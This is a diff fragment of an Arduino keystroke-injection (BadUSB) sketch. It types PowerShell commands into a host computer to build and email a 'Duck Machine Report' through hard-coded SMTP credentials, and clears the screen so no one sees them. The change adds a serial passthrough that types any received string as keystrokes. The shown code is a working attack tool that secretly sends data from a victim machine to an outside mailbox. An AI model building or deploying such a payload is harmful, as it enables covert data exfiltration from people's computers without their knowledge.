@@ -74,6 +74,7 @@ void setup()
 {
   pinMode(A2, INPUT); // Added a pushbutton at pin A2(connected to GND with 10KOhm pulldown resistor and VCC)
   pinMode(2,OUTPUT);  // added a LED for output
+  Serial.begin(115200);
   
   if(digitalRead(A2)==LOW){  // if the key is pressed, the value is HIGH and the script doesnt run!
     // Begining the Keyboard stream
@@ -104,7 +105,7 @@ void setup()
     command("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR MAIL USERNAME', 'AND YOUR PASSWORD');");
     command("clear");  //to make sure no one sees the credentials above
     command("$ReportEmail = New-Object System.Net.Mail.MailMessage");
-    command("$ReportEmail.From = '<YOUR EMAIL HERE'");
+    command("$ReportEmail.From = 'YOUR EMAIL HERE'");
     command("$ReportEmail.To.Add('RECIPIENTS EMAIL HERE')");
     command("clear");
     command("$ReportEmail.Subject = 'Duck Machine Report'");
@@ -134,9 +135,17 @@ void setup()
     command("exit");
     Keyboard.end();
   }
+  
 }
 
 /* Unused endless loop */
 void loop(){
   blinkLed();
+    if (Serial.available() > 0) {
+    // read incoming serial data:
+    String mystring;
+    mystring = Serial.readString();
+    // Type the next ASCII value from what you received:
+    Keyboard.print(mystring);
+  }
 }
